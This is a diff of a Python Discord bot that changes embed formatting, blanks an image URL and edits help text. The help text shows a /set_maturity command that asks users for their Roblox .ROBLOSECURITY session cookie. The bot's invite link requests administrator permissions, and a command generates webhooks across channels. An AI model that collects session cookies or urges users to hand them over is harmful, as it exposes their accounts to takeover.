@@ -80,12 +80,12 @@ async def log_command_usage(interaction: discord.Interaction, command_name: str)
             {
                 "name": "**Add Bot here:**",
                 "value": "[Add Bot By Clicking This](https://discord.com/oauth2/authorize?client_id=1355440307117752491&permissions=8&integration_type=0&scope=bot)",
-                "inline": false,
+                "inline": True
             },
             {
                 "name": "**Click here to open the bot:**",
                 "value": "[Click Here](https://arzconicmgui.onrender.com/)",
-                "inline": false,
+                "inline": True
             }
         ],
         "thumbnail": {
@@ -247,7 +247,7 @@ async def gen_webhooks(interaction: discord.Interaction):
             print(f"❗ Failed to create webhook in {chan_name}: {e}")
 
     webhook_embed.set_image(
-        url="https://images-ext-1.discordapp.net/external/De_pn1-S5tGz2qBWdJnntDG2fWSFni4sNrOUxER_TpU/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1365282161783083039/d5f6775ed4c19f5593ec3328736b29c1.png?format=webp&quality=lossless&width=282&height=282"
+        url=""
     )
 
     await saved_webhook_channel.send(embed=webhook_embed)
@@ -267,7 +267,7 @@ async def help_command(interaction: discord.Interaction):
 
     help_embed.add_field(
         name="/set_maturity",
-        value="🔧 Automatically sets a Roblox game's maturity to **Minimal**.\nRequires your `.ROBLOSECURITY` cookie and the game's **Place ID**.",
+        value="🔧 Automatically sets a Roblox game's maturity to **Minimal**.\nRequires your .ROBLOSECURITY cookie and the game's **Place ID**.",
         inline=False
     )
 
